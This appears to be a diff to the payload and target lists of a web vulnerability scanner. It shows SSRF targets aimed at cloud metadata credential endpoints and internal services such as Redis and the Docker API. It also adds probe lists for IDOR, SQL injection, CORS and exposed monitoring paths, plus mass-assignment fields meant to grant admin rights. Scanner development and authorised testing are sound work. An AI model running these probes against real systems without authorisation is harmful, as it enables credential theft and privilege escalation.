@@ -123,22 +123,23 @@ SSRF_PARAMS = [
 
 SSRF_TARGETS = [
     # AWS IMDSv1 — most common in dataset (AWS: 433 mentions)
-    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam", "security-credentials"]),
-    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
-    ("http://169.254.169.254/latest/user-data", ["#!/", "cloud-init", "password", "key"]),
+    # Indicators must be specific strings that only appear in real metadata responses
+    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "security-credentials", "local-hostname"]),
+    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey", "Token"]),
+    ("http://169.254.169.254/latest/user-data", ["#!/bin/bash", "cloud-init", "runcmd:", "#cloud-config"]),
     # AWS IPv6 bypass
-    ("http://[fd00:ec2::254]/latest/meta-data/", ["ami-id", "instance-id"]),
+    ("http://[fd00:ec2::254]/latest/meta-data/", ["ami-id", "instance-id", "local-hostname"]),
     # GCP metadata
-    ("http://metadata.google.internal/computeMetadata/v1/instance/", ["id", "zone", "service-accounts"]),
+    ("http://metadata.google.internal/computeMetadata/v1/instance/", ["computeMetadata", "service-accounts", "project-id"]),
     # Azure IMDS
-    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["subscriptionId", "resourceGroupName"]),
-    # Internal services
-    ("http://localhost:6379/", ["PONG", "+PONG", "redis"]),
-    ("http://localhost:9200/", ["elasticsearch", "cluster_name", "version"]),
-    ("http://localhost:2375/containers/json", ["Id", "Names", "Image"]),
-    ("http://localhost:4040/api/tunnels", ["tunnels", "public_url", "ngrok"]),
-    ("http://127.0.0.1:8080/", ["admin", "dashboard", "internal"]),
-    ("http://127.0.0.1:3000/", ["admin", "grafana", "kibana"]),
+    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["subscriptionId", "resourceGroupName", "osProfile"]),
+    # Internal services — highly specific response indicators only
+    ("http://localhost:6379/", ["+PONG", "-ERR", "*1\r\n"]),
+    ("http://localhost:9200/", ["\"cluster_name\"", "\"version\":{", "\"tagline\""]),
+    ("http://localhost:2375/containers/json", ["\"NetworkSettings\"", "\"HostConfig\"", "\"Mounts\""]),
+    ("http://localhost:4040/api/tunnels", ["\"public_url\"", "\"proto\":\"https\"", "\"tunnels\""]),
+    ("http://127.0.0.1:8080/actuator/health", ["\"status\":\"UP\"", "\"diskSpace\"", "\"ping\""]),
+    ("http://127.0.0.1:3000/", ["\"grafana\"", "Kibana", "Prometheus"]),
 ]
 
 SSRF_BYPASS_ENCODINGS = [
@@ -462,6 +463,83 @@ TECH_SIGNATURES = {
         "paths": ["/api/"],
     },
 }
+
+# ── REST API COMMON PATHS ─────────────────────────────────────────────────────
+# Probed unauthenticated to find exposed data, IDOR, and mass-assignment vectors
+REST_API_PATHS = [
+    # User/auth endpoints
+    "/api/Users", "/api/users", "/api/v1/users", "/api/v2/users",
+    "/api/Accounts", "/api/accounts", "/api/members",
+    # Product/content
+    "/api/Products", "/api/products", "/api/items", "/api/catalog",
+    # Orders/payments
+    "/api/Orders", "/api/orders", "/api/Baskets", "/api/baskets",
+    "/api/basket/1", "/api/Basket/1", "/rest/basket/1",
+    # Feedback/reviews
+    "/api/Feedbacks", "/api/feedbacks", "/api/reviews", "/api/Comments",
+    # Internal REST APIs common in Node/Express apps
+    "/rest/user/whoami", "/rest/user/login",
+    "/rest/products/search", "/rest/basket/1",
+    # Admin APIs
+    "/api/admin/users", "/api/v1/admin", "/api/internal/users",
+]
+
+# ── PROMETHEUS / MONITORING PATHS ─────────────────────────────────────────────
+MONITORING_PATHS = [
+    ("/metrics", ["process_cpu", "http_request", "nodejs_", "go_goroutines", "# HELP", "# TYPE"]),
+    ("/actuator/metrics", ["measurements", "availableTags", "name"]),
+    ("/actuator/env", ["propertySources", "activeProfiles", "systemProperties"]),
+    ("/actuator/beans", ["beans", "scope", "dependencies"]),
+    ("/actuator/mappings", ["dispatcherServlets", "requestMappingConditions"]),
+    ("/debug/vars", ["cmdline", "memstats", "goroutine"]),
+    ("/server-status", ["Apache Server Status", "Total Accesses", "Uptime"]),
+]
+
+# ── CORS WILDCARD ─────────────────────────────────────────────────────────────
+# Sensitive API paths to probe for wildcard CORS (allows any origin to read response)
+CORS_WILDCARD_API_PATHS = [
+    "/api/Users", "/api/users", "/api/Products", "/api/products",
+    "/api/Orders", "/api/orders", "/api/Feedbacks",
+    "/rest/user/whoami", "/rest/products/search",
+    "/api/v1/users", "/api/v1/me", "/api/me", "/api/user",
+]
+
+# ── SQLI REST API ENDPOINTS ────────────────────────────────────────────────────
+# Common REST API endpoints that accept query params or JSON bodies vulnerable to SQLi
+SQLI_REST_ENDPOINTS = [
+    # GET endpoints with query params
+    ("/rest/products/search", "q"),
+    ("/api/products/search", "q"),
+    ("/api/search", "q"),
+    ("/search", "q"),
+    ("/api/users/search", "q"),
+    ("/api/items/search", "q"),
+]
+
+# ── IDOR REST API PATTERNS ────────────────────────────────────────────────────
+# Authenticated REST endpoints to probe for IDOR (try IDs 1-5)
+IDOR_REST_PATHS = [
+    "/api/Users/{id}", "/api/users/{id}",
+    "/api/Baskets/{id}", "/api/baskets/{id}", "/rest/basket/{id}",
+    "/api/Orders/{id}", "/api/orders/{id}",
+    "/api/Products/{id}", "/api/products/{id}",
+    "/api/Feedbacks/{id}", "/api/feedbacks/{id}",
+    "/api/v1/users/{id}", "/api/v1/orders/{id}",
+]
+
+# ── MASS ASSIGNMENT VECTORS ───────────────────────────────────────────────────
+# POST body fields that may escalate privileges via mass assignment in REST APIs
+MASS_ASSIGNMENT_ROLE_FIELDS = [
+    {"role": "admin"},
+    {"role": "administrator"},
+    {"isAdmin": True},
+    {"is_admin": True},
+    {"admin": True},
+    {"userType": "admin"},
+    {"type": "admin"},
+    {"privilege": 1},
+    {"access_level": 99},
+]
 
 # ── COMMON SENSITIVE PATHS ────────────────────────────────────────────────────
 COMMON_SENSITIVE_PATHS = [
